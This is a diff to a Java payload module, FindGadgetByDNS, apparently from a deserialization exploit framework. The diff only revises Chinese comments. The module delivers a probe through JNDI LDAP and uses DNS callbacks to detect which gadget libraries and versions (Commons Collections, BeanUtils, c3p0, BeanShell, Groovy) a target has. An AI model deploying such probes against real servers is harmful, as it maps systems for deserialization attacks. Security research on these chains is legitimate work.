@@ -24,6 +24,9 @@ import java.util.Random;
  *    一次请求即可拿到全部结果。
  * 5. 注意：本模块通过 javaSerializedData 投递。目标 JDK 在 8u431 / 11.0.25 / 17.0.13 /
  *    21.0.5 之后默认 com.sun.jndi.ldap.object.trustSerialData=false，整个批次失效。
+ *
+ * 版本判别机制：探针以 TC_CLASS 按类名在目标端解析，类存在才触发 DNS。
+ * 各版本段探针靠「标记（内部）类只存在于特定版本段」区分版本，与 serialVersionUID 无关。
  */
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @PayloadTest(skip = "true")
@@ -41,20 +44,20 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
             // CommonsCollections2/4 链，需要 4-4.0 版本
             {"cc40", "org.apache.commons.collections4.functors.ChainedTransformer"},
             {"cc41", "org.apache.commons.collections4.FluentIterable"},
-            // CommonsBeanutils2 链，serialVersionUID 分版本：1.7x-1.8x / 1.9x
+            // CommonsBeanutils 版本段：标记内部类只在对应版本段存在
             {"cb17", "org.apache.commons.beanutils.MappedPropertyDescriptor$1"},
             {"cb18x", "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry"},
             {"cb19x", "org.apache.commons.beanutils.BeanIntrospectionData"},
-            // c3p0，serialVersionUID 分版本
+            // c3p0 版本段：标记类只在对应版本段存在
             {"c3p092x", "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"},
             {"c3p095x", "com.mchange.v2.c3p0.test.AlwaysFailDataSource"},
             // BeanShell1 链入口类
             {"BeanShell2", "bsh.Interpreter"},
-            // bsh，serialVersionUID 分版本：2.0b4 / 2.0b5 / 2.0b6(无法反序列化)
+            // bsh 版本段：标记内部类只在对应版本段存在（2.0b6 无法反序列化）
             {"bsh20b4", "bsh.CollectionManager$1"},
             {"bsh20b5", "bsh.engine.BshScriptEngine"},
             {"bsh20b6", "bsh.collection.CollectionIterator$1"},
-            // Groovy，serialVersionUID 分版本
+            // Groovy 版本段：标记（内部）类只在对应版本段存在
             {"groovy1702311", "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet"},
             {"groovy24x", "groovy.lang.Tuple2"},
             {"groovy244", "org.codehaus.groovy.runtime.dgm$1170"},
